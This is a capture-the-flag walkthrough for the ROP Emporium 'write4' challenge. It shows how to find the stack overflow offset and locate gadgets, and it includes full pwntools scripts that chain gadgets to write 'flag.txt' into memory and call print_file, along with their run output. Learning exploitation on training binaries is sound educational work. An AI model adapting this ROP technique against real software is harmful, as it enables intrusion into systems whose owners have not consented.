
# Write4 - ROP Emporium Walkthrough

Link: https://ropemporium.com/

<a href="https://ropemporium.com/"><img src="0_ret2win/images/logo.jpg" alt="Logo" width="650"/></a>

## Introduction

**Write4** is the fourth challenge in the [ROP Emporium](https://ropemporium.com/) series. The goal is to call the function `print_file("flag.txt")`, but this time the string `"flag.txt"` is not present in the binary. We need to **write it into memory ourselves** before using it.

### Key Concepts
- Return Oriented Programming (ROP)
- Arbitrary memory write
- `pop r14 ; pop r15 ; ret` and `mov [r14], r15 ; ret` gadgets
- Writable memory sections (.data, .bss)

---

## 1. Binary Analysis

### Basic Information

```bash
$ file write4
write4: ELF 64-bit LSB executable, x86-64

$ checksec write4
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

The binary is **64-bit**, **no stack canary**, **no PIE** — perfect for ROP!

### Interesting Functions

Using `radare2`, let's list the functions:

```bash
[0x00400520]> afl
0x00400500    1      6 sym.imp.pwnme
0x00400510    1      6 sym.imp.print_file
0x00400520    1     42 entry0
0x00400617    1     17 sym.usefulFunction
0x00400607    1     16 main
```

We have:
- `print_file` at **`0x400510`** (our target)
- `usefulFunction` at **`0x400617`** (calls `print_file("nonexistent")`)

### Looking at `usefulFunction`

```bash
[0x00400617]> pdf
┌ 17: sym.usefulFunction ();
│   0x00400617      55             push rbp
│   0x00400618      4889e5         mov rbp, rsp
│   0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4
│   0x00400620      e8ebfeffff     call sym.imp.print_file
│   0x00400625      90             nop
│   0x00400626      5d             pop rbp
└   0x00400627      c3             ret
```

It calls `print_file` with `"nonexistent"`. Our goal is to replace this string with `"flag.txt"`.

---

## 2. Finding the Offset with pwndbg

Before building the ROP chain, we need to find the exact offset to control the return address.

### Load the binary in pwndbg

```bash
pwndbg ./write4
```

### Generate a cyclic pattern

```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

### Run and crash

```bash
pwndbg> run
# ... program asks for input, paste the pattern ...
```

### Analyze the crash

```
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c00942 in pwnme () from ./libwrite4.so
...
RBP  0x6161616161616165 ('eaaaaaaa')
RSP  0x7fffffffd9f8 ◂— 0x6161616161616166 ('faaaaaaa')
RIP  0x7ffff7c00942 (pwnme+152) ◂— ret
```

We crashed in `pwnme()` (from `libwrite4.so`) and the stack is filled with our pattern.

### Find the exact offset

```bash
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

**Offset = 40 bytes** before we control the return address.

---

## 3. Understanding pwnme() and print_file()

Since `pwnme` is in `libwrite4.so`, we need to analyze the library:

```bash
# Find the library
ldd write4
linux-vdso.so.1 (0x00007ffff7fc4000)
libwrite4.so => ./libwrite4.so

# Analyze with radare2
r2 -A libwrite4.so

[0x00001060]> afl | grep pwnme
sym.pwnme            | 152

[0x00001060]> pdf @ sym.pwnme
# ... shows buffer allocation and call to fgets/read ...
```

The crash confirms:
- The buffer overflow happens in `pwnme()`
- We control 40 bytes before the return address
- `print_file()` is available at `0x400510`

---

## 4. Finding Gadgets

### Writable Sections

First, let's find **where** to write our string:

```bash
[0x00400520]> iS | grep data
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS .data
```

The **`.data`** section at **`0x00601028`** is perfect:
- Writable (`-rw-`)
- Enough space (`0x10` = 16 bytes)

### Required Gadgets

Let's search for gadgets using `ropper`:

```bash
$ ropper --file write4 --search "pop r14"
0x0000000000400690: pop r14; pop r15; ret;

$ ropper --file write4 --search "mov qword"
0x0000000000400628: mov qword ptr [r14], r15; ret;

$ ropper --file write4 --search "pop rdi"
0x0000000000400693: pop rdi; ret;
```

We have everything we need:
- `pop r14 ; pop r15 ; ret` → **`0x400690`**
- `mov [r14], r15 ; ret` → **`0x400628`**
- `pop rdi ; ret` → **`0x400693`**

---

## 5. Attack Strategy

### 3-Step Plan

1. **Write "flag.txt" into .data**
   - Use `pop r14 ; pop r15 ; ret` to load `.data` address into r14 and `"flag.txt"` into r15
   - Use `mov [r14], r15 ; ret` to write the string to memory

2. **Load .data address into rdi**
   - Use `pop rdi ; ret` to make rdi point to our string

3. **Call print_file**
   - Jump to `print_file` at **`0x400510`**

### Payload Visualization

```
[HIGH STACK]
+-------------------+
| pop r14;pop r15   | (0x400690)
+-------------------+
| .data address     | (0x601028)
+-------------------+
| "flag.txt"        | (bytes)
+-------------------+
| mov [r14],r15     | (0x400628)
+-------------------+
| pop rdi           | (0x400693)
+-------------------+
| .data address     | (0x601028)
+-------------------+
| print_file        | (0x400510)
+-------------------+
[LOW STACK]
```

---

## 6. Python Exploit

### Manual Version (with p64)

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './write4'

# Gadgets
pop_r14_r15 = 0x400690      # pop r14; pop r15; ret
data_addr = 0x601028         # .data section
mov_write = 0x400628         # mov [r14], r15; ret
pop_rdi = 0x400693           # pop rdi; ret
print_file = 0x400510        # print_file@plt

offset = 40

payload = b'A' * offset
payload += p64(pop_r14_r15)     # pop r14; pop r15; ret
payload += p64(data_addr)       # r14 = .data address
payload += b'flag.txt'           # r15 = "flag.txt"
payload += p64(mov_write)        # mov [r14], r15; ret
payload += p64(pop_rdi)          # pop rdi; ret
payload += p64(data_addr)        # rdi = .data address
payload += p64(print_file)       # print_file

io = process('./write4')
io.sendline(payload)
print(io.recvall().decode())
```

### Clean Version with flat()

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './write4'

payload = flat([
    b'A' * 40,
    0x400690,        # pop r14; pop r15; ret
    0x601028,        # r14 = .data address
    b'flag.txt',     # r15 = "flag.txt"
    0x400628,        # mov [r14], r15; ret
    0x400693,        # pop rdi; ret
    0x601028,        # rdi = .data address
    0x400510         # print_file
])

io = process('./write4')
io.sendline(payload)
print(io.recvall().decode())
```

---

## 7. Execution

```bash
$ python3 exploit.py
[*] '/home/kali/ctf/pwn/write4/write4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Starting local process './write4': pid 1840
[+] Receiving all data: Done (118B)
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

**Flag obtained:** `ROPE{a_placeholder_32byte_flag!}`

---

## 8. Detailed Explanation

### Why Twice the .data Address?

Many beginners wonder why we put `0x601028` twice in the payload:

- **First time**: in r14, to tell **where** to write `"flag.txt"`
- **Second time**: in rdi, to tell **where** to read the string when calling `print_file`

These are two different operations that need the same address!

### Why `b'flag.txt'` without p64?

- `p64()` converts a **number** into 8 little-endian bytes
- `b'flag.txt'` is already a raw 8-byte sequence
- If we did `p64(0x666c61672e747874)`, we'd get `b'txt.galf'` (because of little-endian)

### The Stack Execution Flow

1. **First gadget**: `pop r14; pop r15; ret`
   - r14 = `.data` address (where to write)
   - r15 = `"flag.txt"` (what to write)

2. **Second gadget**: `mov [r14], r15; ret`
   - Writes `"flag.txt"` to `.data` section

3. **Third gadget**: `pop rdi; ret`
   - rdi = `.data` address (where our string is)

4. **Fourth**: `print_file`
   - Calls `print_file(rdi)` = `print_file(".data address")`

---

## 9. What We Learned About libwrite4.so

Using `pwndbg` and `radare2` on `libwrite4.so` confirmed:
- The vulnerable function `pwnme()` lives in the library
- It contains a buffer overflow that we control
- The crash happens inside `pwnme()`, then returns to our controlled address
- `print_file()` is imported from the library and available at `0x400510`

This shows that even when the vulnerable code is in a separate library, ROP still works the same way!

---

## 10. Conclusion

Write4 teaches us how to:
- Find ROP gadgets
- Perform arbitrary memory writes
- Build complex ROP chains
- Use pwntools like a pro
- Debug with pwndbg to find offsets
- Analyze libraries with radare2

The next challenge, **badchars**, adds a difficulty: forbidden characters! But with the foundations we have now, we're ready!

---

## Resources

- [ROP Emporium](https://ropemporium.com/)
- [pwntools documentation](https://docs.pwntools.com/)
- [radare2 book](https://radare.gitbooks.io/radare2book/content/)
- [pwndbg](https://github.com/pwndbg/pwndbg)

---

*scaramouch*
